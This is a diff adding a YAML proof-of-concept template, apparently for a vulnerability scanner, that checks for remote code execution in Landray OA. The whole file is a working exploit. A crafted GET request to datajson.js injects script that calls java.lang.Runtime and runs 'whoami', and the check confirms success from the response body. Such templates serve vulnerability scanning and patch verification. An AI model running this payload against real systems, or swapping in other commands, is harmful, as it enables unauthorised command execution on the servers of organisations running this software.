@@ -1,0 +1,20 @@
+name: poc-yaml-landray-oa-rce
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function%20test()%7B%20return%20java.lang.Runtime%7D;r=test();r.getRuntime().exec(%22whoami%22)&type=1
+            headers:
+                Accept: '*/*'
+                Accept-Encoding: gzip, deflate
+                Connection: close
+                User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3861.400 QQBrowser/10.7.4313.400
+        expression: response.status == 200 && response.body.bcontains(b"模拟通过")
+expression: r0()
+detail:
+    author: a403
+    links:
+        - https://github.com/SakuraHack-Y/Landray-oa-rce
